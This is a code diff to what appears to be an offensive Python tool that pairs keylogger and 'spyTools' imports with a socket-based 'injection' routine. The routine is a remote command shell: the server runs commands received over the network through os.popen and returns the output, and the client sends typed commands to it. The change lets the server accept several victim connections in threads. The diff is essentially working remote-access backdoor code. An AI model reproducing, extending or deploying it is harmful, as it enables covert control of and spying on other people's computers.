@@ -3,6 +3,7 @@ import click
 import socket
 import pyaes as pya
 from datetime import datetime
+from threading import Thread
 from pynput.keyboard import Listener
 from lash.Exportables.ikeyboard import *
 from lash.Exportables.spyTools import *
@@ -101,29 +102,18 @@ def injection(h, c, v):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind((host, port))
             print(f'Server online [ host: {host}, port: {port} ] Waiting a connection...') if v else None
-            s.listen()
-            conn, addr = s.accept()
-            s.setblocking(False)
-            with conn:
-                print(f'Client connected: {addr}') if v else None
-                while conn:
-                    actual_path = os.getcwd()
-                    print('Cycle initiated') if v else None
-                    conn.sendall(bytes(actual_path, 'utf-8'))
-                    command = conn.recv(buffer).decode('utf-8').strip()
-                    command_arg1 = command.strip().split()[0]
-                    if not custom_server_manager(conn, buffer, os.getcwd(), command, command_arg1):
-                        output = os.popen(command).read()
-                        conn.send(bytes(output, 'utf-8'))
+            while True:
+                s.listen()
+                conn, addr = s.accept()
+                print(f'{addr} connected') if v else None
+                Thread(target=handle_connection, args=(conn, buffer,)).start()
     elif c:
         host, port = c
         port = port_verify(port)
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(5)
             s.connect((host, port))
             print(injection_client_msg())
             while True:
-                print('Cycle initiated') if v else None
                 path = s.recv(buffer).decode('utf-8')
                 command = str(input(f'{host}\\{path}> ')).strip()
                 command_arg1 = command.split()[0]
